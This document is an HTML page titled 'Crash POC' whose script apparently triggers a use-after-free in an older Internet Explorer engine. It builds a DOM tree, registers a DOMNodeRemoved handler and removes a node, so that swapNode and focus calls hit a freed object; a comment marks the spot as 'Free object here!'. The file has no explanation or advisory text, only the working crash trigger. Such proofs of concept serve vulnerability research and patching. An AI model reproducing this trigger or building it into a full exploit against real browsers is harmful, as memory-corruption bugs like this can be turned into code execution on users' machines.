<!DOCTYPE HTML> 
<html> 
<head> 
<META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE">  
</head> 
<body id="realbody">
<div id="realdiv">
	Crash POC
</div>
<script>

////////////////////////////////////////////
// Create Elements
////////////////////////////////////////////

var elem0 = document.createElement("b")
elem0.id = 'elem0'

var elem1 = document.createElement("b")
elem1.id = 'elem1'
elem1.tabIndex = 1

var elem2 = document.createElement("b")
elem2.id = 'elem2'

var elem3 = document.createElement("b")
elem3.id = 'elem3'

var elem4 = document.createElement("b")
elem4.id = 'elem4'

var elem5 = document.createElement("b")
elem5.id = 'elem5'

var elem6 = document.createElement("b")
elem6.id = 'elem6'

var elem7 = document.createElement("b")
elem7.id = 'elem7'

var elem8 = document.createElement("b")
elem8.id = 'elem8'

var elem9 = document.createElement("b")
elem9.id = 'elem9'

var elem10 = document.createElement("b")
elem10.id = 'elem10'

var elem11 = document.createElement("tr")
elem11.id = 'elem11'

var elem12 = document.createElement("b")
elem12.id = 'elem12'

var elem13 = document.createElement("b")
elem13.id = 'elem13'

var elem14 = document.createElement("b")
elem14.id = 'elem14'

var elem15 = document.createElement("b")
elem15.id = 'elem15'

var elem16 = document.createElement("b")
elem16.id = 'elem16'

var elem17 = document.createElement("b")
elem17.id = 'elem17'

var elem18 = document.createElement("b")
elem18.id = 'elem18'

var elem19 = document.createElement("b")
elem19.id = 'elem19'

////////////////////////////////////////////
// Init Dom Tree
////////////////////////////////////////////

var realbody = document.getElementById('realbody');
realbody.appendChild(elem0);
realbody.appendChild(elem1);
realbody.appendChild(elem2);
realbody.appendChild(elem3);
elem1.appendChild(elem4);
elem0.appendChild(elem5);
elem2.appendChild(elem6);
elem2.appendChild(elem7);
elem5.appendChild(elem8);
elem7.appendChild(elem9);
elem7.appendChild(elem10);
elem1.appendChild(elem11);
elem10.appendChild(elem12);
elem2.appendChild(elem13);
elem9.appendChild(elem14);
elem13.appendChild(elem15);
elem6.appendChild(elem16);
elem8.appendChild(elem17);
elem9.appendChild(elem18);

////////////////////////////////////////////

document.all[19].addEventListener('DOMNodeRemoved', bomber,'true')

range = document.body.createTextRange();
range.moveToElementText(elem11);
range.moveEnd('character', 1);
range.select()

document.execCommand("insertInputFileUpload", true, false);
elem9.removeChild(elem18); // trig

function bomber()
{
	try {document.all[20].swapNode(document.all[11]);} catch(e) { }
	document.all[11].focus(); // Free object here!
	try {document.all[5].swapNode(document.all[6]);} catch(e) { }
	try {document.all[5].swapNode(document.all[11]);} catch(e) { }
}
</script>
</body> 
</html>
